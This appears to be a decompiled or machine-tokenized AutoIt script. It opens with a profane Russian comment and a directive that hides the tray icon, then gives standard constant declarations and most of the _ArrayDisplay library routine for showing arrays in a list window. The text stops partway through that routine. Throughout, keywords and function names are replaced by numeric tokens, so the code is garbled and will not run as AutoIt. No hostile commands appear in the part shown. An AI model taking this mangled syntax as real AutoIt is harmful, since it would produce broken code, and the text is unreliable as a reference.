#СЪЕБИСЬ ОТСЮБДА ДУДА ТЫ ССАНАЯ БЛЯХА МУХА
#EndRegion
#NoTrayIcon
2930$OPT_COORDSRELATIVE=0
2930$OPT_COORDSABSOLUTE=1
2930$OPT_COORDSCLIENT=2
2930$OPT_ERRORSILENT=0
2930$OPT_ERRORFATAL=1
2930$OPT_CAPSNOSTORE=0
2930$OPT_CAPSSTORE=1
2930$OPT_MATCHSTART=1
2930$OPT_MATCHANY=2
2930$OPT_MATCHEXACT=3
2930$OPT_MATCHADVANCED=4
2930$CCS_TOP=1
2930$CCS_NOMOVEY=2
2930$CCS_BOTTOM=3
2930$CCS_NORESIZE=4
2930$CCS_NOPARENTALIGN=8
2930$CCS_NOHILITE=16
2930$CCS_ADJUSTABLE=32
2930$CCS_NODIVIDER=64
2930$CCS_VERT=128
2930$CCS_LEFT=129
2930$CCS_NOMOVEX=130
2930$CCS_RIGHT=131
2930$DT_DRIVETYPE=1
2930$DT_SSDSTATUS=2
2930$DT_BUSTYPE=3
2930$PROXY_IE=0
2930$PROXY_NONE=1
2930$PROXY_SPECIFIED=2
2930$OBJID_WINDOW=0
2930$OBJID_TITLEBAR=-2
2930$OBJID_SIZEGRIP=-7
2930$OBJID_CARET=-8
2930$OBJID_CURSOR=-9
2930$OBJID_ALERT=-10
2930$OBJID_SOUND=-11
2930$DLG_CENTERONTOP=0
2930$DLG_NOTITLE=1
2930$DLG_NOTONTOP=2
2930$DLG_TEXTLEFT=4
2930$DLG_TEXTRIGHT=8
2930$DLG_MOVEABLE=16
2930$DLG_TEXTVCENTER=32
2930$IDC_UNKNOWN=0
2930$IDC_APPSTARTING=1
2930$IDC_ARROW=2
2930$IDC_CROSS=3
2930$IDC_HAND=32649
2930$IDC_HELP=4
2930$IDC_IBEAM=5
2930$IDC_ICON=6
2930$IDC_NO=7
2930$IDC_SIZE=8
2930$IDC_SIZEALL=9
2930$IDC_SIZENESW=10
2930$IDC_SIZENS=11
2930$IDC_SIZENWSE=12
2930$IDC_SIZEWE=13
2930$IDC_UPARROW=14
2930$IDC_WAIT=15
2930$IDI_APPLICATION=32512
2930$IDI_ASTERISK=32516
2930$IDI_EXCLAMATION=32515
2930$IDI_HAND=32513
2930$IDI_QUESTION=32514
2930$IDI_WINLOGO=32517
2930$IDI_SHIELD=32518
2930$IDI_ERROR=$IDI_HAND
2930$IDI_INFORMATION=$IDI_ASTERISK
2930$IDI_WARNING=$IDI_EXCLAMATION
2930$SD_LOGOFF=0
2930$SD_SHUTDOWN=1
2930$SD_REBOOT=2
2930$SD_FORCE=4
2930$SD_POWERDOWN=8
2930$SD_FORCEHUNG=16
2930$SD_STANDBY=32
2930$SD_HIBERNATE=64
2930$STDIN_CHILD=1
2930$STDOUT_CHILD=2
2930$STDERR_CHILD=4
2930$STDERR_MERGED=8
2930$STDIO_INHERIT_PARENT=16
2930$RUN_CREATE_NEW_CONSOLE=65536
2930$UBOUND_DIMENSIONS=0
2930$UBOUND_ROWS=1
2930$UBOUND_COLUMNS=2
2930$MOUSEEVENTF_ABSOLUTE=32768
2930$MOUSEEVENTF_MOVE=1
2930$MOUSEEVENTF_LEFTDOWN=2
2930$MOUSEEVENTF_LEFTUP=4
2930$MOUSEEVENTF_RIGHTDOWN=8
2930$MOUSEEVENTF_RIGHTUP=16
2930$MOUSEEVENTF_MIDDLEDOWN=32
2930$MOUSEEVENTF_MIDDLEUP=64
2930$MOUSEEVENTF_WHEEL=2048
2930$MOUSEEVENTF_XDOWN=128
2930$MOUSEEVENTF_XUP=256
2930$REG_NONE=0
2930$REG_SZ=1
2930$REG_EXPAND_SZ=2
2930$REG_BINARY=3
2930$REG_DWORD=4
2930$REG_DWORD_LITTLE_ENDIAN=4
2930$REG_DWORD_BIG_ENDIAN=5
2930$REG_LINK=6
2930$REG_MULTI_SZ=7
2930$REG_RESOURCE_LIST=8
2930$REG_FULL_RESOURCE_DESCRIPTOR=9
2930$REG_RESOURCE_REQUIREMENTS_LIST=10
2930$REG_QWORD=11
2930$REG_QWORD_LITTLE_ENDIAN=11
2930$HWND_BOTTOM=1
2930$HWND_NOTOPMOST=-2
2930$HWND_TOP=0
2930$HWND_TOPMOST=-1
2930$SWP_NOSIZE=1
2930$SWP_NOMOVE=2
2930$SWP_NOZORDER=4
2930$SWP_NOREDRAW=8
2930$SWP_NOACTIVATE=16
2930$SWP_FRAMECHANGED=32
2930$SWP_DRAWFRAME=32
2930$SWP_SHOWWINDOW=64
2930$SWP_HIDEWINDOW=128
2930$SWP_NOCOPYBITS=256
2930$SWP_NOOWNERZORDER=512
2930$SWP_NOREPOSITION=512
2930$SWP_NOSENDCHANGING=1024
2930$SWP_DEFERERASE=8192
2930$SWP_ASYNCWINDOWPOS=16384
2930$KEYWORD_DEFAULT=1
2930$KEYWORD_NULL=2
2930$DECLARED_LOCAL=-1
2930$DECLARED_UNKNOWN=0
2930$DECLARED_GLOBAL=1
2930$ASSIGN_CREATE=0
2930$ASSIGN_FORCELOCAL=1
2930$ASSIGN_FORCEGLOBAL=2
2930$ASSIGN_EXISTFAIL=4
2930$BI_ENABLE=0
2930$BI_DISABLE=1
2930$BREAK_ENABLE=1
2930$BREAK_DISABLE=0
2930$CDTRAY_OPEN="open"
2930$CDTRAY_CLOSED="closed"
2930$SEND_DEFAULT=0
2930$SEND_RAW=1
2930$DIR_DEFAULT=0
2930$DIR_EXTENDED=1
2930$DIR_NORECURSE=2
2930$DIR_REMOVE=1
2930$DT_ALL="ALL"
2930$DT_CDROM="CDROM"
2930$DT_REMOVABLE="REMOVABLE"
2930$DT_FIXED="FIXED"
2930$DT_NETWORK="NETWORK"
2930$DT_RAMDISK="RAMDISK"
2930$DT_UNKNOWN="UNKNOWN"
2930$DT_UNDEFINED=1
2930$DT_FAT="FAT"
2930$DT_FAT32="FAT32"
2930$DT_EXFAT="exFAT"
2930$DT_NTFS="NTFS"
2930$DT_NWFS="NWFS"
2930$DT_CDFS="CDFS"
2930$DT_UDF="UDF"
2930$DMA_DEFAULT=0
2930$DMA_PERSISTENT=1
2930$DMA_AUTHENTICATION=8
2930$DS_UNKNOWN="UNKNOWN"
2930$DS_READY="READY"
2930$DS_NOTREADY="NOTREADY"
2930$DS_INVALID="INVALID"
2930$MOUSE_CLICK_LEFT="left"
2930$MOUSE_CLICK_RIGHT="right"
2930$MOUSE_CLICK_MIDDLE="middle"
2930$MOUSE_CLICK_MAIN="main"
2930$MOUSE_CLICK_MENU="menu"
2930$MOUSE_CLICK_PRIMARY="primary"
2930$MOUSE_CLICK_SECONDARY="secondary"
2930$MOUSE_WHEEL_UP="up"
2930$MOUSE_WHEEL_DOWN="down"
2930$NUMBER_AUTO=0
2930$NUMBER_32BIT=1
2930$NUMBER_64BIT=2
2930$NUMBER_DOUBLE=3
2930$OBJ_NAME=1
2930$OBJ_STRING=2
2930$OBJ_PROGID=3
2930$OBJ_FILE=4
2930$OBJ_MODULE=5
2930$OBJ_CLSID=6
2930$OBJ_IID=7
2930$EXITCLOSE_NORMAL=0
2930$EXITCLOSE_BYEXIT=1
2930$EXITCLOSE_BYCLICK=2
2930$EXITCLOSE_BYLOGOFF=3
2930$EXITCLOSE_BYSHUTDOWN=4
2930$PROCESS_STATS_MEMORY=0
2930$PROCESS_STATS_IO=1
2930$PROCESS_LOW=0
2930$PROCESS_BELOWNORMAL=1
2930$PROCESS_NORMAL=2
2930$PROCESS_ABOVENORMAL=3
2930$PROCESS_HIGH=4
2930$PROCESS_REALTIME=5
2930$RUN_LOGON_NOPROFILE=0
2930$RUN_LOGON_PROFILE=1
2930$RUN_LOGON_NETWORK=2
2930$RUN_LOGON_INHERIT=4
2930$SOUND_NOWAIT=0
2930$SOUND_WAIT=1
2930$SHEX_OPEN="open"
2930$SHEX_EDIT="edit"
2930$SHEX_PRINT="print"
2930$SHEX_PROPERTIES="properties"
2930$TCP_DATA_DEFAULT=0
2930$TCP_DATA_BINARY=1
2930$UDP_OPEN_DEFAULT=0
2930$UDP_OPEN_BROADCAST=1
2930$UDP_DATA_DEFAULT=0
2930$UDP_DATA_BINARY=1
2930$UDP_DATA_ARRAY=2
2930$TIP_NOICON=0
2930$TIP_INFOICON=1
2930$TIP_WARNINGICON=2
2930$TIP_ERRORICON=3
2930$TIP_BALLOON=1
2930$TIP_CENTER=2
2930$TIP_FORCEVISIBLE=4
2930$WINDOWS_NOONTOP=0
2930$WINDOWS_ONTOP=1
2930$WIN_STATE_EXISTS=1
2930$WIN_STATE_VISIBLE=2
2930$WIN_STATE_ENABLED=4
2930$WIN_STATE_ACTIVE=8
2930$WIN_STATE_MINIMIZED=16
2930$WIN_STATE_MAXIMIZED=32
2930$MB_OK=0
2930$MB_OKCANCEL=1
2930$MB_ABORTRETRYIGNORE=2
2930$MB_YESNOCANCEL=3
2930$MB_YESNO=4
2930$MB_RETRYCANCEL=5
2930$MB_CANCELTRYCONTINUE=6
2930$MB_HELP=16384
2930$MB_ICONSTOP=16
2930$MB_ICONERROR=16
2930$MB_ICONHAND=16
2930$MB_ICONQUESTION=32
2930$MB_ICONEXCLAMATION=48
2930$MB_ICONWARNING=48
2930$MB_ICONINFORMATION=64
2930$MB_ICONASTERISK=64
2930$MB_USERICON=128
2930$MB_DEFBUTTON1=0
2930$MB_DEFBUTTON2=256
2930$MB_DEFBUTTON3=512
2930$MB_DEFBUTTON4=768
2930$MB_APPLMODAL=0
2930$MB_SYSTEMMODAL=4096
2930$MB_TASKMODAL=8192
2930$MB_DEFAULT_DESKTOP_ONLY=131072
2930$MB_RIGHT=524288
2930$MB_RTLREADING=1048576
2930$MB_SETFOREGROUND=65536
2930$MB_TOPMOST=262144
2930$MB_SERVICE_NOTIFICATION=2097152
2930$MB_RIGHTJUSTIFIED=$MB_RIGHT
2930$IDTIMEOUT=-1
2930$IDOK=1
2930$IDCANCEL=2
2930$IDABORT=3
2930$IDRETRY=4
2930$IDIGNORE=5
2930$IDYES=6
2930$IDNO=7
2930$IDCLOSE=8
2930$IDHELP=9
2930$IDTRYAGAIN=10
2930$IDCONTINUE=11
2930$STR_NOCASESENSE=0
2930$STR_CASESENSE=1
2930$STR_NOCASESENSEBASIC=2
2930$STR_STRIPLEADING=1
2930$STR_STRIPTRAILING=2
2930$STR_STRIPSPACES=4
2930$STR_STRIPALL=8
2930$STR_CHRSPLIT=0
2930$STR_ENTIRESPLIT=1
2930$STR_NOCOUNT=2
2930$STR_REGEXPMATCH=0
2930$STR_REGEXPARRAYMATCH=1
2930$STR_REGEXPARRAYFULLMATCH=2
2930$STR_REGEXPARRAYGLOBALMATCH=3
2930$STR_REGEXPARRAYGLOBALFULLMATCH=4
2930$STR_ENDISSTART=0
2930$STR_ENDNOTSTART=1
2930$SB_ANSI=1
2930$SB_UTF16LE=2
2930$SB_UTF16BE=3
2930$SB_UTF8=4
2930$SE_UTF16=0
2930$SE_ANSI=1
2930$SE_UTF8=2
2930$STR_UTF16=0
2930$STR_UCS2=1
2930$_ARRAYCONSTANT_SORTINFOSIZE=11
29$__G_AARRAYDISPLAY_SORTINFO[$_ARRAYCONSTANT_SORTINFOSIZE]
2930$ARRAYDISPLAY_COLALIGNLEFT=0
2930$ARRAYDISPLAY_TRANSPOSE=1
2930$ARRAYDISPLAY_COLALIGNRIGHT=2
2930$ARRAYDISPLAY_COLALIGNCENTER=4
2930$ARRAYDISPLAY_VERBOSE=8
2930$ARRAYDISPLAY_NOROW=64
2930$_ARRAYCONSTANT_TAGHDITEM="uint Mask;int XY;ptr Text;handle hBMP;int TextMax;int Fmt;lparam Param;int Image;int Order;uint Type;ptr pFilter;uint State"
2930$_ARRAYCONSTANT_TAGLVITEM="struct;uint Mask;int Item;int SubItem;uint State;uint StateMask;ptr Text;int TextMax;int Image;lparam Param;"&"int Indent;int GroupID;uint Columns;ptr pColumns;ptr piColFmt;int iGroup;endstruct"
32__ARRAYDISPLAY_SHARE(3036$AARRAY,$STITLE=41,$SARRAYRANGE=41,$IFLAGS=41,$VUSER_SEPARATOR=41,$SHEADER=41,$IMAX_COLWIDTH=41,$HUSER_FUNCTION=41,$BDEBUG=39)
28$VTMP,$SMSGBOXTITLE=(($BDEBUG)("DebugArray")("ArrayDisplay"))
4$STITLE=415$STITLE=$SMSGBOXTITLE
4$SARRAYRANGE=415$SARRAYRANGE=""
4$IFLAGS=415$IFLAGS=0
4$VUSER_SEPARATOR=415$VUSER_SEPARATOR=""
4$SHEADER=415$SHEADER=""
4$IMAX_COLWIDTH=415$IMAX_COLWIDTH=350
4$HUSER_FUNCTION=415$HUSER_FUNCTION=0
28$ITRANSPOSE=17($IFLAGS,$ARRAYDISPLAY_TRANSPOSE)
28$ICOLALIGN=17($IFLAGS,6)
28$IVERBOSE=17($IFLAGS,$ARRAYDISPLAY_VERBOSE)
28$INOROW=17($IFLAGS,$ARRAYDISPLAY_NOROW)
28$IBUTTONBORDER=(($BDEBUG)(40)(20))
28$SMSG="",$IRET=1
4219($AARRAY)5
28$IDIMENSION=369($AARRAY,$UBOUND_DIMENSIONS),$IROWCOUNT=369($AARRAY,$UBOUND_ROWS),$ICOLCOUNT=369($AARRAY,$UBOUND_COLUMNS)
4$IDIMENSION>25
$SMSG="Larger than 2D array passed to function"
$IRET=2
8
4$IDIMENSION=15
$ITRANSPOSE=0
8
6
$SMSG="No array variable passed to function"
8
4$SMSG5
4$IVERBOSE1249($MB_SYSTEMMODAL+$MB_ICONERROR+$MB_YESNO,$SMSGBOXTITLE&" Error: "&$STITLE,$SMSG&@CRLF&@CRLF&"Exit the script?")=$IDYES5
35
6
34287($IRET,0,0)
8
8
28$ICW_COLWIDTH=250($VUSER_SEPARATOR)
28$SCURR_SEPARATOR=258("GUIDataSeparatorChar")
4$VUSER_SEPARATOR=""5$VUSER_SEPARATOR=$SCURR_SEPARATOR
28$IITEM_START=0,$IITEM_END=$IROWCOUNT-1,$ISUBITEM_START=0,$ISUBITEM_END=(($IDIMENSION=2)($ICOLCOUNT-1)(0))
28$BRANGE_FLAG=40,$AVRANGESPLIT
4$SARRAYRANGE5
28$AARRAY_RANGE=326($SARRAYRANGE&"||","(?U)(.*)\|",3)
4$AARRAY_RANGE[0]5
$AVRANGESPLIT=331($AARRAY_RANGE[0],":")
4@ERROR5
$IITEM_END=250($AVRANGESPLIT[1])
6
$IITEM_START=250($AVRANGESPLIT[1])
4$AVRANGESPLIT[2]<>""5
$IITEM_END=250($AVRANGESPLIT[2])
8
8
8
4$IITEM_START<05$IITEM_START=0
4$IITEM_END>$IROWCOUNT-15$IITEM_END=$IROWCOUNT-1
4$IITEM_START>$IITEM_END5
$VTMP=$IITEM_START
$IITEM_START=$IITEM_END
$IITEM_END=$VTMP
8
4$IITEM_START<>02$IITEM_END<>$IROWCOUNT-15$BRANGE_FLAG=39
4$IDIMENSION=21$AARRAY_RANGE[1]5
$AVRANGESPLIT=331($AARRAY_RANGE[1],":")
4@ERROR5
$ISUBITEM_END=250($AVRANGESPLIT[1])
6
$ISUBITEM_START=250($AVRANGESPLIT[1])
4$AVRANGESPLIT[2]<>""5
$ISUBITEM_END=250($AVRANGESPLIT[2])
8
8
4$ISUBITEM_START>$ISUBITEM_END5
$VTMP=$ISUBITEM_START
$ISUBITEM_START=$ISUBITEM_END
$ISUBITEM_END=$VTMP
8
4$ISUBITEM_START<05$ISUBITEM_START=0
4$ISUBITEM_END>$ICOLCOUNT-15$ISUBITEM_END=$ICOLCOUNT-1
4$ISUBITEM_START<>02$ISUBITEM_END<>$ICOLCOUNT-15$BRANGE_FLAG=39
8
8
28$SDISPLAYDATA="["&$IROWCOUNT&"]"
4$IDIMENSION=25
$SDISPLAYDATA&=" ["&$ICOLCOUNT&"]"
8
28$STIPDATA=""
4$BRANGE_FLAG5
4$STIPDATA5$STIPDATA&=" - "
$STIPDATA&="Range set"
8
4$ITRANSPOSE5
4$STIPDATA5$STIPDATA&=" - "
$STIPDATA&="Transposed"
8
28$ASHEADER=331($SHEADER,$SCURR_SEPARATOR,$STR_NOCOUNT)
4369($ASHEADER)=0528$ASHEADER[1]=[""]
$SHEADER="Row"
28$IINDEX=$ISUBITEM_START
4$ITRANSPOSE5
$SHEADER="Col"
13$J=$IITEM_START15$IITEM_END
$SHEADER&=$SCURR_SEPARATOR&"Row "&$J
14
6
4$ASHEADER[0]5
13$IINDEX=$ISUBITEM_START15$ISUBITEM_END
4$IINDEX>=369($ASHEADER)518
$SHEADER&=$SCURR_SEPARATOR&$ASHEADER[$IINDEX]
14
8
13$J=$IINDEX15$ISUBITEM_END
$SHEADER&=$SCURR_SEPARATOR&"Col "&$J
14
8
4$INOROW5$SHEADER=336($SHEADER,4)
4$IVERBOSE1($IITEM_END-$IITEM_START+1)*($ISUBITEM_END-$ISUBITEM_START+1)>100005
298($SMSGBOXTITLE,"Preparing display"&@CRLF&@CRLF&"Please be patient",300,100)
8
2830$_ARRAYCONSTANT_GUI_DOCKBOTTOM=64
2830$_ARRAYCONSTANT_GUI_DOCKBORDERS=102
2830$_ARRAYCONSTANT_GUI_DOCKHEIGHT=512
2830$_ARRAYCONSTANT_GUI_DOCKLEFT=2
2830$_ARRAYCONSTANT_GUI_DOCKRIGHT=4
2830$_ARRAYCONSTANT_GUI_DOCKHCENTER=8
2830$_ARRAYCONSTANT_GUI_EVENT_CLOSE=-3
2830$_ARRAYCONSTANT_GUI_FOCUS=256
2830$_ARRAYCONSTANT_SS_CENTER=1
2830$_ARRAYCONSTANT_SS_CENTERIMAGE=512
2830$_ARRAYCONSTANT_LVM_GETITEMCOUNT=(4096+4)
2830$_ARRAYCONSTANT_LVM_GETITEMRECT=(4096+14)
2830$_ARRAYCONSTANT_LVM_GETCOLUMNWIDTH=(4096+29)
2830$_ARRAYCONSTANT_LVM_SETCOLUMNWIDTH=(4096+30)
2830$_ARRAYCONSTANT_LVM_GETITEMSTATE=(4096+44)
2830$_ARRAYCONSTANT_LVM_GETSELECTEDCOUNT=(4096+50)
2830$_ARRAYCONSTANT_LVM_SETEXTENDEDLISTVIEWSTYLE=(4096+54)
2830$_ARRAYCONSTANT_LVS_EX_GRIDLINES=1
2830$_ARRAYCONSTANT_LVIS_SELECTED=2
2830$_ARRAYCONSTANT_LVS_SHOWSELALWAYS=8
2830$_ARRAYCONSTANT_LVS_EX_FULLROWSELECT=32
2830$_ARRAYCONSTANT_WS_EX_CLIENTEDGE=512
2830$_ARRAYCONSTANT_WS_MAXIMIZEBOX=65536
2830$_ARRAYCONSTANT_WS_MINIMIZEBOX=131072
2830$_ARRAYCONSTANT_WS_SIZEBOX=262144
2830$_ARRAYCONSTANT_WM_SETREDRAW=11
2830$_ARRAYCONSTANT_LVSCW_AUTOSIZE=-1
2830$_ARRAYCONSTANT_LVSCW_AUTOSIZE_USEHEADER=-2
28$ICOORDMODE=258("GUICoordMode",1)
28$IORGWIDTH=210,$IHEIGHT=200,$IMINSIZE=250
28$HGUI=128($STITLE,$IORGWIDTH,$IHEIGHT,41,41,19($_ARRAYCONSTANT_WS_SIZEBOX,$_ARRAYCONSTANT_WS_MINIMIZEBOX,$_ARRAYCONSTANT_WS_MAXIMIZEBOX))
28$AIGUISIZE=385($HGUI)
28$IBUTTONWIDTH_1=$AIGUISIZE[0]/2
28$IBUTTONWIDTH_2=$AIGUISIZE[0]/3
28$IDLISTVIEW=143($SHEADER,0,0,$AIGUISIZE[0],$AIGUISIZE[1]-$IBUTTONBORDER,$_ARRAYCONSTANT_LVS_SHOWSELALWAYS)
164($IDLISTVIEW,$_ARRAYCONSTANT_LVM_SETEXTENDEDLISTVIEWSTYLE,$_ARRAYCONSTANT_LVS_EX_GRIDLINES,$_ARRAYCONSTANT_LVS_EX_GRIDLINES)
164($IDLISTVIEW,$_ARRAYCONSTANT_LVM_SETEXTENDEDLISTVIEWSTYLE,$_ARRAYCONSTANT_LVS_EX_FULLROWSELECT,$_ARRAYCONSTANT_LVS_EX_FULLROWSELECT)
164($IDLISTVIEW,$_ARRAYCONSTANT_LVM_SETEXTENDEDLISTVIEWSTYLE,$_ARRAYCONSTANT_WS_EX_CLIENTEDGE,$_ARRAYCONSTANT_WS_EX_CLIENTEDGE)
28$IDCOPY_ID=9999,$IDCOPY_DATA=99999,$IDDATA_LABEL=99999,$IDUSER_FUNC=99999,$IDEXIT_SCRIPT=99999
4$BDEBUG5
$IDCOPY_ID=130("Copy Data && Hdr/Row",0,$AIGUISIZE[1]-$IBUTTONBORDER,$IBUTTONWIDTH_1,20)
$IDCOPY_DATA=130("Copy Data Only",$IBUTTONWIDTH_1,$AIGUISIZE[1]-$IBUTTONBORDER,$IBUTTONWIDTH_1,20)
28$IBUTTONWIDTH_VAR=$IBUTTONWIDTH_1
28$IOFFSET=$IBUTTONWIDTH_1
4225($HUSER_FUNCTION)5
$IDUSER_FUNC=130("Run User Func",$IBUTTONWIDTH_2,$AIGUISIZE[1]-20,$IBUTTONWIDTH_2,20)
$IBUTTONWIDTH_VAR=$IBUTTONWIDTH_2
$IOFFSET=$IBUTTONWIDTH_2*2
8
$IDEXIT_SCRIPT=130("Exit Script",$IOFFSET,$AIGUISIZE[1]-20,$IBUTTONWIDTH_VAR,20)
$IDDATA_LABEL=141($SDISPLAYDATA,0,$AIGUISIZE[1]-20,$IBUTTONWIDTH_VAR,18,19($_ARRAYCONSTANT_SS_CENTER,$_ARRAYCONSTANT_SS_CENTERIMAGE))
6
$IDDATA_LABEL=141($SDISPLAYDATA,0,$AIGUISIZE[1]-20,$AIGUISIZE[0],18,19($_ARRAYCONSTANT_SS_CENTER,$_ARRAYCONSTANT_SS_CENTERIMAGE))
8
20
21$ITRANSPOSE2$BRANGE_FLAG
167($IDDATA_LABEL,16711680)
181($IDDATA_LABEL,$STIPDATA)
22
178($IDLISTVIEW,$_ARRAYCONSTANT_GUI_DOCKBORDERS)
178($IDCOPY_ID,$_ARRAYCONSTANT_GUI_DOCKLEFT+$_ARRAYCONSTANT_GUI_DOCKBOTTOM+$_ARRAYCONSTANT_GUI_DOCKHEIGHT)
178($IDCOPY_DATA,$_ARRAYCONSTANT_GUI_DOCKRIGHT+$_ARRAYCONSTANT_GUI_DOCKBOTTOM+$_ARRAYCONSTANT_GUI_DOCKHEIGHT)
178($IDDATA_LABEL,$_ARRAYCONSTANT_GUI_DOCKLEFT+$_ARRAYCONSTANT_GUI_DOCKBOTTOM+$_ARRAYCONSTANT_GUI_DOCKHEIGHT)
178($IDUSER_FUNC,$_ARRAYCONSTANT_GUI_DOCKHCENTER+$_ARRAYCONSTANT_GUI_DOCKBOTTOM+$_ARRAYCONSTANT_GUI_DOCKHEIGHT)
178($IDEXIT_SCRIPT,$_ARRAYCONSTANT_GUI_DOCKRIGHT+$_ARRAYCONSTANT_GUI_DOCKBOTTOM+$_ARRAYCONSTANT_GUI_DOCKHEIGHT)
164($IDLISTVIEW,$_ARRAYCONSTANT_WM_SETREDRAW,0,0)
28$IROWINDEX,$ICOLFILL
4$ITRANSPOSE5
13$I=$ISUBITEM_START15$ISUBITEM_END
$IROWINDEX=__ARRAYDISPLAY_ADDITEM($IDLISTVIEW,"NULL")
4$INOROW5
$ICOLFILL=0
6
__ARRAYDISPLAY_ADDSUBITEM($IDLISTVIEW,$IROWINDEX,"Col "&$I,0)
$ICOLFILL=1
8
13$J=$IITEM_START15$IITEM_END
4$IDIMENSION=25
$VTMP=$AARRAY[$J][$I]
6
$VTMP=$AARRAY[$J]
8
23377($VTMP)
21"Array"
__ARRAYDISPLAY_ADDSUBITEM($IDLISTVIEW,$IROWINDEX,"{Array}",$ICOLFILL)
216
__ARRAYDISPLAY_ADDSUBITEM($IDLISTVIEW,$IROWINDEX,$VTMP,$ICOLFILL)
24
$ICOLFILL+=1
14
14
6
13$I=$IITEM_START15$IITEM_END
$IROWINDEX=__ARRAYDISPLAY_ADDITEM($IDLISTVIEW,"NULL")
4$INOROW5
$ICOLFILL=0
6
__ARRAYDISPLAY_ADDSUBITEM($IDLISTVIEW,$IROWINDEX,"Row "&$I,0)
$ICOLFILL=1
8
13$J=$ISUBITEM_START15$ISUBITEM_END
4$IDIMENSION=25
$VTMP=$AARRAY[$I][$J]
6
$VTMP=$AARRAY[$I]
8
23377($VTMP)
21"Array"
__ARRAYDISPLAY_ADDSUBITEM($IDLISTVIEW,$IROWINDEX,"{Array}",$ICOLFILL)
216
__ARRAYDISPLAY_ADDSUBITEM($IDLISTVIEW,$IROWINDEX,$VTMP,$ICOLFILL)
24
$ICOLFILL+=1
14
14
8
4$ICOLALIGN5
13$I=015$ICOLFILL-1
__ARRAYDISPLAY_JUSTIFYCOLUMN($IDLISTVIEW,$I,$ICOLALIGN/2)
14
8
164($IDLISTVIEW,$_ARRAYCONSTANT_WM_SETREDRAW,1,0)
28$IBORDER=(($IROWINDEX>19)(65)(45))
28$IWIDTH=$IBORDER,$ICOLWIDTH=0,$AICOLWIDTH[$ICOLFILL],$IMIN_COLWIDTH=55
13$I=015369($AICOLWIDTH)-1
164($IDLISTVIEW,$_ARRAYCONSTANT_LVM_SETCOLUMNWIDTH,$I,$_ARRAYCONSTANT_LVSCW_AUTOSIZE)
$ICOLWIDTH=164($IDLISTVIEW,$_ARRAYCONSTANT_LVM_GETCOLUMNWIDTH,$I,0)
4$SHEADER<>""5
164($IDLISTVIEW,$_ARRAYCONSTANT_LVM_SETCOLUMNWIDTH,$I,$_ARRAYCONSTANT_LVSCW_AUTOSIZE_USEHEADER)
28$ICOLWIDTHHEADER=164($IDLISTVIEW,$_ARRAYCONSTANT_LVM_GETCOLUMNWIDTH,$I,0)
4$ICOLWIDTH<$IMIN_COLWIDTH1$ICOLWIDTHHEADER<$IMIN_COLWIDTH5
164($IDLISTVIEW,$_ARRAYCONSTANT_LVM_SETCOLUMNWIDTH,$I,$IMIN_COLWIDTH)
$ICOLWIDTH=$IMIN_COLWIDTH
7$ICOLWIDTHHEADER<$ICOLWIDTH5
164($IDLISTVIEW,$_ARRAYCONSTANT_LVM_SETCOLUMNWIDTH,$I,$ICOLWIDTH)
6
$ICOLWIDTH=$ICOLWIDTHHEADER
8
6
4$ICOLWIDTH<$IMIN_COLWIDTH5
164($IDLISTVIEW,$_ARRAYCONSTANT_LVM_SETCOLUMNWIDTH,$I,$IMIN_COLWIDTH)
$ICOLWIDTH=$IMIN_COLWIDTH
8
8
$IWIDTH+=$ICOLWIDTH
$AICOLWIDTH[$I]=$ICOLWIDTH
14
4$IWIDTH>@DESKTOPWIDTH-1005
$IWIDTH=$IBORDER
13$I=015369($AICOLWIDTH)-1
4$AICOLWIDTH[$I]>$IMAX_COLWIDTH5
164($IDLISTVIEW,$_ARRAYCONSTANT_LVM_SETCOLUMNWIDTH,$I,$IMAX_COLWIDTH)
$IWIDTH+=$IMAX_COLWIDTH
6
$IWIDTH+=$AICOLWIDTH[$I]
8
14
8
4$IWIDTH>@DESKTOPWIDTH-1005
$IWIDTH=@DESKTOPWIDTH-100
7$IWIDTH<$IMINSIZE5
$IWIDTH=$IMINSIZE
8
28$TRECT=65("struct; long Left;long Top;long Right;long Bottom; endstruct")
58("user32.dll","struct*","SendMessageW","hwnd",159($IDLISTVIEW),"uint",$_ARRAYCONSTANT_LVM_GETITEMRECT,"wparam",0,"struct*",$TRECT)
28$AIWIN_POS=387($HGUI)
28$AILV_POS=42($HGUI,"",$IDLISTVIEW)
$IHEIGHT=(($IROWINDEX+4)*(66($TRECT,"Bottom")-66($TRECT,"Top")))+$AIWIN_POS[3]-$AILV_POS[3]
4$IHEIGHT>@DESKTOPHEIGHT-1005
$IHEIGHT=@DESKTOPHEIGHT-100
7$IHEIGHT<$IMINSIZE5
$IHEIGHT=$IMINSIZE
8
4$IVERBOSE5297()
195(@SW_HIDE,$HGUI)
397($HGUI,"",(@DESKTOPWIDTH-$IWIDTH)/2,(@DESKTOPHEIGHT-$IHEIGHT)/2,$IWIDTH,$IHEIGHT)
195(@SW_SHOW,$HGUI)
28$IONEVENTMODE=258("GUIOnEventMode",0),$IMSG
__ARRAYDISPLAY_REGISTERSORTCALLBACK($IDLISTVIEW,2,39,"__ArrayDisplay_SortCallBack")
91
$IMSG=184()
23$IMSG
21$_ARRAYCONSTANT_GUI_EVENT_CLOSE
18
21$IDCOPY_ID,$IDCOPY_DATA
28$ISEL_COUNT=164($IDLISTVIEW,$_ARRAYCONSTANT_LVM_GETSELECTEDCOUNT,0,0)
4$IVERBOSE1(3$ISEL_COUNT)1($IITEM_END-$IITEM_START)*($ISUBITEM_END-$ISUBITEM_START)>100005
298($SMSGBOXTITLE,"Copying data"&@CRLF&@CRLF&"Please be patient",300,100)
8
28$SCLIP="",$SITEM,$ASPLIT
13$I=015164($IDLISTVIEW,$_ARRAYCONSTANT_LVM_GETITEMCOUNT,0,0)-1
4$ISEL_COUNT13(164($IDLISTVIEW,$_ARRAYCONSTANT_LVM_GETITEMSTATE,$I,$_ARRAYCONSTANT_LVIS_SELECTED)<>0)5
19
8
$SITEM=__ARRAYDISPLAY_GETITEMTEXTSTRING($IDLISTVIEW,$I)
4$IMSG=$IDCOPY_ID1$INOROW5
$SITEM="Row "&($I+(($ITRANSPOSE)($ISUBITEM_START)($IITEM_START)))&$SCURR_SEPARATOR&$SITEM
8
4$IMSG=$IDCOPY_DATA13$INOROW5
$SITEM=327($SITEM,"^Row\s\d+\|(.*)$","$1")
8
4$ICW_COLWIDTH5
$ASPLIT=331($SITEM,$SCURR_SEPARATOR)
$SITEM=""
13$J=115$ASPLIT[0]
$SITEM&=309("%-"&$ICW_COLWIDTH+1&"s",322($ASPLIT[$J],$ICW_COLWIDTH))
14
6
$SITEM=328($SITEM,$SCURR_SEPARATOR,$VUSER_SEPARATOR)
8
$SCLIP&=$SITEM&@CRLF
14
$SITEM=$SHEADER
4$IMSG=$IDCOPY_ID5
